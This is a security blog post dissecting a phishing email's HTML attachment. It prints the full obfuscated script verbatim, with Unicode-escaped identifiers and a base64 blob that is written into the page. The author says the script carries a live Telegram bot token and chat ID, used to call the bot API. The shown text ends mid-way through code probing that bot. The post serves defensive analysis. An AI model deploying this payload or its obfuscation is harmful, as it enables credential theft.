+++
title = "More Phishing Attempts"
date = 2022-08-23T00:31:33Z
description = "Another day, another phish"
draft = false
tags = ["security"]
tracking_area = "javascript"
tracking_id = ""
+++

Well, that was quick, less than a week since [my last one]({{<ref "/posts/2022-08-18-breaking-down-another-phishing-attempt.md">}}) and here we go again.

For transparency, this one did actually land in my junk mail, so I wouldn't have seen it if I hadn't been looking for an email that I should've received (totally unrelated to getting phished though 🤣), but since I did see it, it's time to dig into it again!

The premise of this one is the same as the last one, although the email was much more brief, only containing my email address in the body and the HTML file attachment.

Speaking of the HTML, it was a bit different this time:

```html
<script>var e\u006dail="<yes, my email was here>";var tok\u0065\u006e='5\x374\062\u0038\0607394\u003a\u0041AEY\171\x56gRLp3\132YYweU\161\144cbUdsGWj\163\x6e-\x53k\063w\u0030';var c\u0068a\u0074\u005fid=5486255038;var d\u0061ta=ato\u0062("PC\x46\105T0\x4eUWV\102\106IGh0bWw+Cjxod\x471sIGRp\143\x6a0ibHRyIiBjbGFzc\x7a0iI\x69B\x73\131W\x35nPSJlb\u0069I\053CiAg\111C\x41\x38a\107VhZD4KIC\x41g\u0049DxtZXRh\111Gh\x30dHAt\132XF1aXY9I\153NvbnR\x6cbnQtVHlw\132\123Ig\u005929udGVudD0i\144G\x564\u0064C9od\x47\u0031sOy\u0042\152aG\106y\x632V0PVVURi04I\x6a4\x4bICAgID\u0078\x30a\u0058RsZ\x545\124\141Wdu\111Gl\x75\u0049HR\166\x49H\154v\144XI\x67YWNj\1423Vu\x64DwvdG\u006c0bGU+C\x69\x41gICA8bWV0YSB\x6fd\x48Rw\114\127\126\170dWl2PS\x4a\u0059\114VVBL\x55N\166\x62X\x42hdG\x6c\151bGUiIGNvb\x6e\122\u006c\u0062nQ9I\x6b\154FPW\x56\x6bZ2U\151Pg\157gICAg\120G1ldG\x45\147\u0062m\u0046\x74\x5aT\u0030idmlld3B\u0076cn\u0051iIG\u004ev\x62n\x52\x6cbnQ9\x49n\144\160ZHRo\u0050WR\154\x64\x6d\154jZS13aW\122\x30aC\167gaW\x35p\144\x47lhbC1z\x592FsZT0x\x4cj\x41s\x49G\u0031\150eG\u006ct\144W0\x74c2NhbGU9M\1514\167\u004cCB1\x632VyLXN\u006aYW\170\u0068Y\155x\154PXllcy\111\x2bCi\x41gICA\u0038c\u0032Ny\x61X\u00420IHNyY\u007a\u0030\151a\110\x520cHM6Ly9ha\x6d\1064Lm\144vb\u0032d\163ZW\106wa\130M\165Y29tL2FqYX\u0067vbG\154icy9qcX\u0056\154\143n\u006bv\115y40\114j\x45vanF1\x5a\x58J\u0035Lm\061\160b\u00695\x71\x63\u0079I\u002bPC\071zY3J\x70cHQ+\u0043iA\x67\111C\x418bG\x6cuayByZWw\u0039\111\x6e\u004eob\063J\060Y\063V0IGlj\1422\x34i\111Ghy\132WY9Imh0\144HBzOi\u0038vY\x57F\153\x59\u0032Ru\114m1\u007aZn\x52h\144\130R\157L\1555l\u0064C\x39z\141GFyZW\121v\u004dS4\u0077\x4c2Nvb\x6eR\154bnQva\x57\061\x68Z\062VzL\x32Zh\x64ml\u006a\u00622\065fYV9l\x64XBh\u0065WZnZ2hx\141\x57FpN\062s5c29\x73\116\155\170\x6e\u004di5\x70Y\062\070\151\120iA\x67\u0049C\x41KIC\x41\147\111D\170saW5\x72I\x47\122hdG\105tbG\071hZ\u0047\u0056yPSJj\132\1074iIGNyb3Nzb3J\160Z2l\165PS\112hbm9u\u0065W1vdXMiIGh\u0079\x5a\x57Y9Imh\x30\144HBz\117i8vYW\x46\153Y\062R\165Lm1zZn\x52h\x64XRoL\u006d5ld\x43\x39l\x633R\172\114\x7a\111\x75\x4dS9jb\062\x350\132W50L2NkbmJ1b\x6d\122\163ZXM\166Y29\165\144m\x56yZ2Vk\x4c\156\u0059yLm\170vZ\062\154u\114\u006d1pb\x6c\0716a\u0058\154\u0030\132j\u0068kenQ5ZWcxczYtb\u0032hobGV\156M\x695jc3M\x69IH\x4albD\060ic3R5bGVza\107Vld\103\111+CiAg\x49C\u00418\x63\062\u004eya\130\x420Pg\u006fg\x49C\101gICAg\x49CQ\157ZG\071\x6a\u0064\1271l\x62\156Qp\x4c\x6eJl\x59\127R5\u004bG\1321bm\1160\x61\x579\165KC\x6bgeyQ\157\u0049iNkaXNwb\x47F5Tm\106tZ\123IpLmVt\143\u0048\1225\113CkuY\130Bw\132\1275\u006bK\x47VtYW\u006c\163\113TsgJ\1035nZX\x52\x4bU\0609OKCJodHRwcz\x6f\x76L2\u0046\167a\u00535pcG\x6cm\x65S5v\x63mc\x2f\132m9yb\127\u00460PWp\u007ab\0624\x69L\x43Bm\x64W5jdGlv\142ihkYXRhK\x53\102\067JCg\u0069\111\062\x64m\u005ayIp\x4cmh0bWwo\x5aGF0YS5\160cCk7fSl\071\x4b\124s\x4bIC\101\x67\111Dw\166\u00632\116\171aX\1020\x50go8L2\150\x6cY\127Q+\103jxib2R5IGN\x73YXNz\120SJ\x6aYiIgc3R\065bGU9I\x6d\122pc3B\163YX\1536IGJ\x73b2Nr\x4f\171\x49+Cjx\x77IGlkPS\u004an\132m\u0063iIHN0e\127x\u006cPSJ\153\x61\x58\116w\x62\x47\x465O\151Bu\x62\0625\x6cOy\x49\x2bPC9\167\120go8Zm9y\142S\102uYW1\154P\123JmM\123Iga\127Q9\u0049m\x6bw\u004djgx\x49\151Bub3Z\x68bG\x6ckY\x58Rl\120\x53Jub3\x5ah\u0062G\154kYXRlI\x69\x42zc\x47\126\x73bGNoZ\127NrP\u0053\x4a\155YWx\x7a\132SI\x67\142WV0aG\071kPS\u004awb3N0I\x69\u0042\060Y\130J\u006eZ\x58Q9\111l9\060b3AiIG\106\061\u0064G\u0039jb21\167\u0062GV0\u005a\x54\u0030ib\x32ZmI\151BhY\063\122pb24\x39IiI+CiAgIC\x41\070\132Gl\x32IG\u004esYX\116z\120SJsb\x32\144\x70bi1\167YWd\u0070bmF\060ZWQtc\x47FnZ\123I+\x43i\101\147ICAgICAg\u0050\107R\u0070d\151\x42pZD0ib\107l\u006eaH\x52ib3\150UZW1wbGF\060Z\125NvbnR\u0068\141\1275lc\u0069I\x2b\x43jxkaXY\147aWQ9\x49mxpZ\x32\u00680\x59m\x39\064QmFj\141\062\144y\u00623V\x75Z\u0045\116v\x62nRhaW5\u006cci\x49+C\u0069AgICA8ZGl2I\107NsYX\116z\120SJiYWNrZ3JvdW\x35kLWltYWd\154\114W\x68\x76b\107R\u006c\x63i\x49gcm9\163Z\x540icHJ\154c\x32VudGF0aW9uI\x6a4KICA\x67ID\x78\x6ba\x58YgY2\x78h\x633\x4d\071\u0049m\112\150Y2\164ncm\x391b\x6dQt\x61W1hZ2U\x67ZX\1500LW\112\x68\x592tn\143\15591bmQ\164aW1\x68\x5a2UiIH\1160eWx\154\x50\123JiYWN\x72Z3\112vd\1275kLWltY\u0057dl\117\151\x42\u0031\x63\x6dw\x6fJnF1\u0062\x33Q\x37aHR0cH\115\066L\x799h\x59\x57\x52\x6aZG4ubX\116mdGF1dG\x67u\x62mV\060L3\116oYXJl\132\103\x38x\x4c\x6aAv\x5929u\144G\u0056\165\u0064C\x39pbWFnZ\130\u004dvYmFj\x612d\171b3VuZHMvM\1549i\u0059zN\u006b\115z\112hN\152k\062O\u0044k\u0031\x5a\152c\x34YzE\u0035\132G\1312Y\172\143\u0078NzU\064NmE1ZC\x35zdmcmcXVv\u0064\u0044s\160OyI\053PC\x39kaX\131+Cjwv\x5aGl2Pjwv\132Gl2P\x67o\x38\u005aGl\x32\x49GNsYX\x4ezPSJv\x64X\122lc\151I\x2bC\151AgI\u0043A8\x5aG\154\u0032IGN\x73YXN\x7a\120\123J0ZW1w\x62\107F0\132S1zZ\127N\060aW\x39uI\x471haW4\164c2\x56\152\144Glvb\151I\u002b\x43iAg\111C\u0041\147IC\x41\x67\u0050\x47Rp\u0064iBjb\x47\u0046zcz0\x69bW\u006ck\x5a\x47\x78l\x49G\x564dC\x31t\x61W\122\u006bbGUiP\x67ogICA\u0067\111CAgIC\101gI\103\u00418Z\107l2IGN\u0073\x59\130Nz\120SJmdW\170sLWhlaWd\u006f\144C\x49\u002bCj\170\u006b\x61\x58Y\147Y2xhc3M9I\u006dZ\163Z\130gtY\062\u0039\u0073d\1271\u0075\x49j4\x4bICA\u0067ID\u0078k\x61XYgY2x\u0068\u00633\1159\u0049nd\160bi1zY3Jv\142Gwi\x50gogI\103\x41gICAg\u0049Dx\x6baX\131\147a\u0057Q9Imx\160\x5a2h0Ym94I\151\u0042jbGF\172\143z0\151c2\154nb\x691pb\x691i\u00623\147\x67ZXh0LXN\160Z24ta\127\u0034t\x59m\x394IGZ\u0068ZG\u0055taW4\164\x62G\154\x6ea\u0048Ri\1423gi\120gog\x49\103A\x67IC\101\x67\u0049\104\x78k\141XY+PG\154t\132yBjbG\x46\x7ac\1720ib\u00479\u006eb\171Igcm\u0039\163\u005a\u00540ia\x571\156IiB\x77b\x6d\x64zcm\x4d9I\x6dh0\x64H\u0042\x7a\x4f\1518vYW\x46\x6bY2R\x75Lm\x31\172Z\156RhdX\122\x6f\114m5\u006c\x64C\x39za\107\106yZWQv\x4dS4\x77L\062Nvb\x6e\x52lb\u006e\121\u0076a\x571\150\x5a2V\u007aL2\u0031\x70\131\063\112vc\x329\155dF\071s\142\x32\x64\u0076\x582Vk\x4fWM\x35\132W\u0049\x77ZGNl\115TdkNzU\x79YmVkZWE2YjVhY\062\122hNmQ5\x4cnBu\x5ay\111gc3Znc3J\x6a\x50SJodHR\167\143zo\166L2\x46\x68\u005aGNkbi5\164\x632Z\060\x59XV0aC5u\132\130\x51vc\x32hhcm\126kL\x7aE\165M\x439jb2\x350ZW50\1142lt\131\127\144l\u0063y9t\141\x57N\171\x623NvZ\x6eRfb\u00479\u006e\14219lZ\124\126j\x4f\107Q5\132mI2M\152Q\x34YzkzOGZ\153MGRjMTkz\x4ezBlO\124B\x69ZC5z\x64m\u0063iI\110NyYz0\x69\x61HR0c\u0048M6Ly9hY\127RjZG\x34ubXN\155dGF1\144\x47\x67\x75bm\126\x30L3\116\157Y\130JlZC\u0038\x78LjAv\x5929ud\107\u0056u\144\1039p\x62W\x46nZX\115vbW\154jcm9z\x622Z\x30X2\170vZ29fZWU\061\u0059\172hk\x4fWZiN\u006aI\u0030OGM5MzhmZDBkYzE5Mzcw\132Tkw\131m\121uc\x33ZnIiBh\x62\110\u00519Ik\061pY3Jv\u00632\u0039\x6d\u0064\103I+PC9\x6ba\u0058Y\u002b\x43\x69AgICA\u0067IC\x41g\u0050GRpdiByb2\170\154\120S\x4a\x74Y\127luIj4KPGR\x70\x64\x69BjbGF\172cz0\151Y\u0057\065pb\u0057F\060ZS\102\x7a\142\107\x6ck\132S1pbi1uZXh0\111j\064\u004bICAgIC\x41\x67ICA8ZGl2\111D4KPG\x52pdi\x42\152\142G\106\172c\x7a\x30\x69\u0061WRlbn\x52\160dHl\103\x59\127\065\165Z\130\x49\x69Pgo\x67\x49CAgPGR\u0070di\102p\u005aD\x30iZG\x6cz\x63GxheU\065\x68bW\125iIGNsYXNzPS\112p\132GVu\x64Gl0eSI+\x50C\071kaX\131+\103\152w\x76Z\107l2\120jw\166Z\107l2P\x67\x6fgICA\x67\120C9k\141XY+C\151AgICA\u0038Z\x47l2IGN\u0073YXN\x7aP\u0053Jw\u0059\x57\144\x70\142\x6dF\x30aW9u\u004cXZp\u005aXc\x67\x59W5\u0070bWF0ZSBoYX\u004d\u0074a\x57\122l\142nRpd\x48\x6bt\x59m\x46ubmVy\x49HN\163\141WR\154LWl\x75LW\u0035le\110Qi\x50g\157gICA\x67\u0050GR\u0070\144\u006a4\x4bC\u006a\170k\141XYg\141WQ\u0039ImxvZ2lu\123\107VhZG\x56\x79\x49iB\u006a\u0062GFzcz\x30\u0069\u0063m93\111HRp\x64\107xlI\x47\u00564d\x4310\141X\x52sZSI\u002b\x43\x69AgICA8ZGl\x32\x49H\112\166b\107U\x39\x49m\x68l\131W\122pb\x6dci\u0049GFy\141WE\x74bG\126\u0032ZW\u00779\111\152\x45i\x50kVudG\x56yI\x48B\x68c3N3b3JkP\103\x39\x6baXY+C\x6aw\x76ZGl\062\u0050\x67\x6f\u0038ZGl2IG\154kP\123\u004a\154cnJ\166\u0063n\x423IiBzdHlsZT0iY2\x39s\142\063I\066\u0049\x48Jl\x5aD\163g\142W\x46yZ\x32luOiAxNXB4\117yBtYXJnaW4t\u0062\x47\126mdD\157\x67M\u0048B\064\117\x79\x42t\x59XJnaW\064\164\x64G\u0039w\u004fiAwc\x48g7\111G1\x68\143md\x70b\x691\x69b3\u0052\x30\1422\x306\u0049D\x42w\145\u0044siP\x6a\x77vZ\u0047l2\120go8Z\107l2I\107\u004esYXN\x7a\x50S\112yb3\143iPg\x6fg\u0049C\x41gPGR\160d\151Bj\142\107\106zc\u007a\u0030\151Zm9yb\123\061n\143m91cC\u0042\152\142\u0032\167t\u0062\127Q\x74\u004d\152\u0051i\u0050\147ogICAgI\103A\147\u0049\x44xkaX\131gY2xhc3\x4d\071InB\x73\131WNla\107\x39sZG\x56yQ2\071udGFpbmVy\111\x6a4\113IC\101gICA\u0067ICAgI\103AgP\x47lucHV0\u0049\x47\x35\x68\142WU9In\x42hc3N3ZCIg\144H\x6cw\132T\x30\u0069c\u0047F\x7ac3d\x76\143mQiI\107\u006ckP\123JpMDEx\117CIgYXV0b2NvbXB\u0073ZXRlP\x53\u004av\u005amYi\x49GNsYXN\x7aP\x53\x4amb3Jt\114W\x4evbn\x52\171b2wg\x61\x57\x35wd\x58QgZ\x58h\x30L\127\154uc\110V0\111H\122leH\121t\131m\071\u0034I\107V4dC10\x5aX\x680LW\u004a\166e\u0043I\147cGxhY\062\126o\u0062\x32xkZ\u0058I9\u0049\u006c\102\150c3N\063b3JkIiByZXF1aXJlZ\u0043\x41vPg\1578L\x32\x52pd\1524K\u0049\103AgID\x77v\u005a\107l\x32P\x67o8L\062Rpd\152\x34KPGR\x70\u0064\x6a4K\120GRpdiBjbGFzcz0i\x63\1079z\x61\x58Rpb2\u0034\u0074Yn\x560\144G9uc\x79I+C\151\101g\111CA8Z\x47l2P\147ogICA\x67ICA\147\111D\u0078\x6ba\130Y\147Y2xh\1433M9In\u004avd\171I\x2b\103i\u0041g\u0049CA\147I\103\u0041gI\x43AgIDxk\141XYgY2x\x68c\x33M9\x49m\x4e\x76\x62C1t\u005aC\060yNCI+\u0043iAg\111C\101\x67IC\101g\111CA\x67\u0049CAgI\x43A8ZG\x6c2I\u0047\u004es\x59\130NzP\123J0\u005aXh\x30LTEzI\152\064\113I\x43AgICAg\111CA\x67I\u0043A\147\111CAgICAg\111CA\x38\x5aG\1542\111\107Ns\131X\u004ez\u0050S\u004amb\063\u004at\114\127d\171b3\u0056wI\1524\113\111CA\x67\x49CAgI\103A\x67\x49CAgICAg\u0049\x43AgI\103\101g\111CA\x67PGEgaW\u00519\u0049\x6d\154k\121\x56\x39\121V0RfRm9\x79\x5a29\u0030\x55\x47F\172c\u0033dvcmQiIHJvb\107\u00559\111\x6d\170pb\155\x73\151\111\x47\150yZWY\071I\x69\115\151Pk\132\u0076c\155dvdH\122lb\x69B\u0074eSBwY\130Nzd\x32\x39yZDw\166YT4K\x49C\x41g\111CAgI\x43\101gI\103\u0041\u0067I\x43A\u0067\u0049\x43Ag\111CA8\u004c\062R\x70dj\x34KP\x47Rp\x64\u0069Bj\x62GFz\x63z0i\132m9ybS\x31ncm9\u0031c\x43I\x2bCjwvZG\x6c2PgogICAg\x49\x43Ag\111\104x\153a\130\u0059\x67Y2\170\150c\x33M9\u0049\u006dZ\x76cm0tZ3JvdXAi\x50go\147ICAg\111CAg\u0049CAgICA\070YSBpZD\x30iaTE2\u004ej\u0067i\111\107hyZ\x57Y9Ii\x4diPlNpZ24\x67aW4gd2l\060aCBhbm90\141GVyI\107Fj\x5929\u0031bnQ8L2E\053CiAgICAg\111C\101g\x50C9k\141XY+PC\x39ka\u0058\131+\x50\103\x39\u006baXY+PC9ka\x58Y+Ci\x41gIC\1018L2\x52\u0070\u0064\1524K\103\x69\x41\x67I\u0043\u0041\x38ZGl\u0032\u0049G\x4es\131\x58\116zPSJ3aW4tYnV0d\107\071uL\x58B\x70\x62i1ib3\x520b20\151\u0050g\157gI\x43Ag\u0049CAgIDx\153a\u0058Yg\1312x\150\1433M9\111nJ\166dyI\u002bCiAg\x49\u0043AgI\x43AgICA\x67\111Dx\153\u0061XY+PGRpdiB\u006a\142GFzc\172\060iY29s\114X\x68\x7a\u004cT\x49\x30\u0049\1075vLXB\x68\132GR\u0070bmctb\x47\126md\x431\171aWdod\103B\151\u0064XR0b\x324tY2\071\x75dG\u0046p\x62mVy\111j4KI\103A\147IDx\153\141XYgY2x\150c\x33M\x39ImlubG\154uZ\1231i\142G9ja\u0079I\053CiA\u0067IC\101g\111\x43Ag\120GlucHV\x30IH\x525\u0063GU9\u0049nN1Ym1pd\u0043I\147\x61W\1219Im\x6c\x6b\x550\154C\144X\x52\060\u0062245I\x69BjbGFz\u0063\x7a0\x69d\x32l\x75\114WJ1dHRvbiBidXR0b\u00325\146cHJpbWF\u0079\145S\u0042\x69d\u0058\1220b\u0032\064g\x5aXh0L\x57J1dHRv\x62iBw\u0063\x6dltY\x58J\x35IG\1264\144C1wcm\154tY\x58J5I\151B2\131Wx1ZT0\x69U2lnbiBp\x62iI\x2b\103iAgIC\x418L2\122\x70dj4K\x50\u00439\153\u0061XY+PC9\153aXY\x2bC\151\x41gI\103A\x67\111CAgPC9k\141XY+C\151A\147\111CA8\x4c\x32Rp\144j\064\113P\x439kaXY\053\x50C9kaXY\x2bC\151AgICA\x38\x4c2\x52pdj4KPC9\153a\u0058Y+PC9k\141\x58\131+PC\u0039k\u0061\x58Y+PC9ka\u0058Y+\x43\x69Ag\111CA8L2Rpd\1524KP\1039kaXY+\x50C9\x6baXY+\u0043\151\x41gICAgIC\u0041\u0067\x50\u00439k\141XY+CiAg\u0049C\x41\x38L2Rpdj4KICA\147\111\104\x78kaXY\147a\x57Q9ImZv\x623Rl\u0063iIgc\x6d\071sZT\x30\151\x5929u\144\107VudGluZm8\x69\x49\u0047\116sYXNz\120S\112m\u00622\0710Z\x58IgZXh0\x4cWZvb3\122l\x63iI+Ci\101gI\x43\101\x67I\103\x41gPGRpdj4KPG\x52\160\144\x69BpZ\1040iZ\155\071vd\x47VyTGl\x75\u00613\x4di\111GNsY\130N\x7a\120\123J\u006db2\0710ZX\x4aOb2R\154IHR\u006ceHQtc\062\126\x6ab2\065\u006b\x59X\112\u0035Ij4K\111CA\147ICAg\x49CA\x38YS\102\160ZD\060i\132nRyV\u0047VybX\u004diI\u0047hyZWY9\111iMi\x49G\u004e\x73YXNzP\x53Jm\14229\060Z\130I\164Y29\x75\u0064GVudC\x42l\145HQ\164Z\1559v\144G\x56\u0079L\x57Nv\x62nRlbnQ\u0067Zm9vdGV\171LWl0\x5a\1270\x67\u005a\x58h\x30LWZvb3Rlci1pd\x47V\u0074Ij5UZXJtc\171BvZiB1c\u0032\125\x38\114\u0032\105\053C\u0069\x41gICAg\x49CA\147P\x47EgaWQ9ImZ0c\x6cByaX\x5ahY3\u006biIG\x68yZ\u0057Y9I\x69MiIG\x4e\x73YXNz\120SJmb290ZX\111tY29udGVu\x64\103BleHQtZ\155\u0039\x76\144G\x56yL\x57\x4evb\u006eR\u006cbnQgZ\u006d9\x76dGVyLWl\x30ZW\x30gZXh0LWZvb3Rlc\x69\x31p\x64GVt\u0049j\x35Qcml\062\x59WN\x35I\103ZhbXA7I\u0047\x4e\u0076\1422tpZX\u004d8L\x32E+C\151A\x67ICA\x38\131SBpZD0i\142W9yZU9wd\u0047l\u0076bn\u004d\151I\x47\150\171\132WY\071Ii\x4d\u0069I\107FyaWE\164bGFiZWw\u0039\111k\116\u0073aWNrIGhl\x63mU\x67Zm9yIHRyb\u0033V\x69bGVzaG9v\u0064\u0047luZyBp\142mZvcm1\x68dGlvb\x69IgY2x\x68c3\u004d\x39Im\132\x76b3Rl\x63i1\x6ab\06250Z\u0057\0650IGV4\144C1mb2\x390ZXItY29udG\x56udCBm\x62290\x5aXItaXRlb\x53Bl\145\110\121\164Z\x6d\071\x76\144\x47VyLW\1540Z\u00570\147\x5aGV\x69dWctaXR\x6cb\123B\u006c\145HQtZGVidWctaXRlb\123\111+Li4u\x50\1039\150\x50go\070L2Rp\x64\x6a48L\062\u0052p\x64j\x34K\111CAgIDw\x76\132\x47l2Pgo8L2\u0052pd\x6a48\1142Rp\x64\x6a4\x38L2\u0052\u0070dj4K\x50C9\155b\x33\x4atPgo\x38\x632Ny\x61X\x420P\x67ogICA\147dm\x46y\111\107\x4evdW50I\x440gM\u0044s\113ICAgI\x48ZhciBwc3dkMTsKIC\101gIG\122vY3\x56tZW50\x4cmdldEVsZ\u0057\061lbnRC\x65UlkKCJp\x5aF\x4eJ\u0051nV0d\107\u0039uOSIp\114mF\x6bZE\x56\x32\u005aW50\x54Glzd\x47VuZXI\x6fI\155\116\163aWNrIiwgZn\u0056u\u00593Rpb\x324\u006f\x5aSk\147ewogI\103A\x67ZS\u0035\x77cmV2\u005aW5\u0030R\107Vm\x59XVsdC\147p\x4fwo\u004bIC\101gIHZhci\x42wc\063dk\u0049D0\147\x5aG9jdW\061lbnQu\x5a2\x56\u0030\x52W\170lb\u0057\x56udEJ\065SWQoJ2k\x77MTE\x34\x4aykudmFsdW\125\u0037CiA\147IC\x42p\132i\101ocH\x4e3Z\x43A\u0039PSBudWx\163IHx8IHB\u007a\u00642Q\x67PT\x30gI\u0069Ipewo\u0067\x49CAgICA\147IGRvY\063VtZW50Lmd\154\x64\x45Vs\132\x571lbnRCe\u0055lkKCdlcnJ\166c\156B\063\u004aykuaW5uZ\x58\x4a\x49\126E\x31MI\x440\147YF\u006c\166dXIg\131W\x4ejb3\x56\165dCBw\u0059XNz\14429yZCBjYW\065\x75\x62\x33QgY\155\125gZW1\x77d\110kuIGl\x6dIHlvdSB\u006bb24n\u0064CB\x79\u005aW1l\x62WJl\143iB5b3\126y\u0049\x48Bhc3N3b3JkLC\x418\131SBocmVm\120\u0053\111j\u0049j5y\x5a\x58NldC\x42pdC\x42\x75b3cu\u0050C9hPmA7Ci\u0041\u0067\111CAgIC\x41\147c2V0\126\107ltZW91\144CgoKS\x419\120iB7ZG9jdW\061lbnQ\x75Z2V0RWx\x6c\142W\126u\x64E\u004a5SWQoJ2\x56ycm9ycH\u0063\u006eK\x53\x35p\u0062m5\x6c\x63\x6bhUT\x55wgP\123AnJzt9LCAzM\104AwK\124t\u0039C\151AgICBl\x62\110NlI\107l\x6dK\x48Bz\x642QubGVuZ3Ro\x49\104wgNS\u006c\067\103iA\x67ICA\147\111\x43A\x67\132\107\x39j\x64\u00571l\x62\x6eQu\x5a2\x56\060RWx\x6c\142\x57\126udE\1125S\127QoJ2V\171cm9\u0079cHcnKS\x35pb\1555\x6cc\u006bh\125TUwg\x50S\101i\x57W91\143iBh\1312N\x76d\x57\x350\111HB\u0068c\x33N3\u00623J\x6bIGlzIHRvbyBz\141\x479y\144C4\u0069Owog\x49CA\147IC\101gIH\116ldFRpb\127VvdXQ\u006fK\x43\153gPT4ge\062RvY\u0033\x56t\132W5\x30Lm\x64\154dE\x56sZ\x571\u006cb\x6eRCe\u0055lkKCdlcnJvc\x6eB\u0033Jyk\x75\x61\1275uZ\u0058JIV\x451MID0gJyc7I\x47\u0052\x76\x593Vt\132W50Lmd\154dE\u0056sZW\061\x6cbn\122CeU\x6ckKCJpMDI4M\x53IpLn\u004alc2V0KCk\x37\x66S\167gMzAw\u004dCk7CiAgICB9IGV\163c2U\147\141\127\131g\x4bGNvdW50PD\x45pewog\111CA\147I\x43\x41gIHBz\u0064\062\121\170\x49D0gZ\107\x39jdW1lbnQ\x75Z2V\060R\u0057x\x6cbWVudEJ5SWQo\112\x32kwM\x54\x45\064Jykudm\x46\u0073dW\1257CiAgICAg\x49\u0043AgZ\u0047\071jd\x571lbn\121uZ\x32\x560\122Wxlb\u0057V\x75dEJ5SWQ\x6f\x4a\x32Vycm9ycHcn\u004bS5pbm5lckhUT\x55wgPS\x42g\x57W91c\151BhY\x32\x4e\166d\x5750I\107\x39\171\111\x48B\150c\063N3b3Jk\111GlzIG\u006cuY29y\u0063mV\u006adC\x34g\u0061W\131geW91\u0049GRvbid\x30\x49\x48Jlb\x57VtY\x6d\x56\u0079\111Hl\166dXI\u0067cGFzc3\144vcmQsIDx\150IG\u0068yZWY9Ii\x4diPn\u004a\x6cc2\u00560I\107l0IG5v\144y\x348L\x32E+Y\x44\163\x4bICAg\x49\x43A\147\x49CBkb2N1bWVudC\x35\u006eZXRFbGV\164ZW5\x30Qn\u006c\112ZC\147iaTAyODEiKS5yZXNldC\147\160Oy\102jb3V\u0075dCsr\1173\x30KICAgIGVsc\x32Uge\u0077\u006f\u0067ICAgICA\x67IH\132\x68ci\x42JUC\101\x39IGRvY\x33\x56tZW50Lmdld\105V\u0073\132W1lbnRCeU\u006ckKCdn\x5amc\x6eKS5\060Z\u0058h0Q2\x39udGV\165dD\163KICAg\u0049CA\x67IC\x422YX\u0049gbWVz\1432FnZS\x419IGA\x39\u0050T\0609PT0g\u0054zM2NS\x42SZ\u0058N1bHQgPT09PT0\u0039\130\x48Jc\x62\153VtYWls\u004f\151Ak\1452VtYWlsfV\170yX\u0047\x35QYX\116\172\x6429yZ\x44E6IC\x527cHN3\x5a\u0044F9XH\u004a\x63blBhc3N3b3\112\u006bMjogJHt\x77c\063dk\u0066V\u0078\171X\x475JUD\x6f\147a\u0048R\060c\x48\x4d\066L\x799pc\1031h\143G\x6bu\13129tL\x79R\067SV\102\071XHJ\143b\x6cVzZ\u0058\u0049t\x51W\144\u006cb\u006eQ\x36ICR7bmF2a\127dhd\1079\u0079L\x6e\x56z\x5aX\x4aB\132\x32Vud\u00481\143\143l\x78\u0075PT09P\124\u00309PT0\u0039\u0050T09PT09PT\x30\x39PWA7\u0043iAgI\103\101gICA\u0067\u0064mF\171\111HNld\110\122pb\x6ddzID0gew\x6f\147IC\101\x67ICAg\x49CAg\111\103A\151\u0059X\1165\142m\115i\x4fiB\060\x63nVlLCA\u0069Y\u0033\x4av\u00633N\x45b\062\u0031haW\x34i\x4fiB0\143\x6eVlLCA\x69dXJsIj\x6f\x67\111\155h\x30\x64HBz\x4f\151\x38v\x59XBp\u004cnRlbGVncmFtL\u006d9\x79Zy\u0039i\142\063\121i\111\u0043sgdG\x39\162\132W\064gK\x79\x41\x69L3Nlb\x6dRNZ\x58NzY\127\x64lIiwKI\103\101g\111\x43A\147IC\x41g\111C\u0041gIm1l\144GhvZCI6ICJQ\1241N\x55\u0049\u0069\x77gI\x6dhlYW\122l\143nMi\u004fiB7\x49kN\x76b\156\122lb\156Q\164\x56H\154\167\132\123I\066ICJ\x68cH\102\x73aWN\x68dG\154\x76\142\x699qc\u00329uI\151\167\u0067\u0049mN\u0068Y2\u0068lL\x57NvbnRyb2\167i\x4fiAib\155\u0038t\x59\062\106jaGU\x69fS\x77K\u0049\x43\x41gICA\147\111C\101g\111CA\x67\111\u006d\122hd\x47\105iOi\u0042KU09O\114n\1160cm\154u\1322lme\123h7\111mNoYX\u0052\u0066a\x57\121iO\151B\152\141GF0X2lkLCAidGV\x34\x64\x43I\066\111\1071l\143\x33NhZ\062V9KX\x30\u004b\111\x43\u0041gIC\x41gIC\x41kLm\106\161YX\147o\1432\u00560dG\x6c\u0075\1323\115p\u004c\155R\x76bm\x55\x6f\113HJlc3Bv\142nN\x6cKSA9PiB7d\u0032luZ\107\071\x33Lm\u0078\u0076Y\u0032\x46\x30\141W9uLn\x4a\x6c\x63Gx\x68\x592UoJ\x32h\u0030\x64\110BzOi\070v\x63G9\x79d\107FsL\u006d\x39m\x5amljZ\123\u0035j\x622\x30\166c2Vy\x64m\154jZ\130N0YXR1cy\x63p\1173\x30pOwo\u0067IC\101\x67fSA\113I\103\x41gIH\060\x70O\x79AKP\x439zY3Jp\x63HQ+C\u006awvZGl\x32\120jwvYm9k\x65T48L\u0032h0b\127w+");\u0064\u006fc\u0075m\u0065\u006e\u0074.write(data);</script>
```

What's interesting is they've exploited that you can use unicode escaping for JavaScript identifier names, which [is legal as per the spec](https://262.ecma-international.org/#sec-identifier-names).

Let's take this:

```js
var e\u006dail="<yes, my email was here>";
```

We have the unicode codepoint of `006d` (the `\u` indicates that it's a unicode escape) and if we refer to a [unicode lookup table](https://unicode-table.com/en/) we'll see that `006d` is `m`, meaning that we have an identifier of `email`. Bet you didn't guess THAT did you!

Clearly, this particular version of the file has gone **hard** on the unicode identifiers, even down to `\u0064\u006fc\u0075m\u0065\u006e\u0074.write`, which is just `document.write`.

This brings us to the question of _why_, why would you convert all the JavaScript, or at least some of it, to unicode? I can only speculate, but I'd assume that they are doing it as a layer of obfuscation, it's just another thing that makes the code less readable to anyone who goes snooping around in it and make them think that maybe it is legitimate in what it's doing. It does come at the expense of size, going from 8.6KB to 17.8KB, which is why this isn't a common form of obfuscation for served JavaScript, but if you're running an offline file like this, it doesn't really matter.

## Digging into Telegram

In the last post I was saddened by the fact that I couldn't use the Telegram API with the token that was in the email body as it was no longer authorised. This time though, I'm pleased to say that it **is** active, at least at the time of writing!

So, let's poke it.

From the JavaScript, we can see that the token is used to call the `bot` parts of the API, suggesting that it's a valid bot token and nothing more, but let's start trying to figure out the user info for the bot. I'm going to do this in JavaScript, for something a bit different, and we'll start by getting the bot and chat info:

```javascript
import "dotenv/config";

(async () => {
  const token = process.env.TELEGRAM_TOKEN || "";
  const chat_id = process.env.CHAT_ID || "";
  const telegramAPIBase = `https://api.telegram.org/bot${token}`;

  let res = await fetch(`${telegramAPIBase}/getMe`, { method: "POST" });
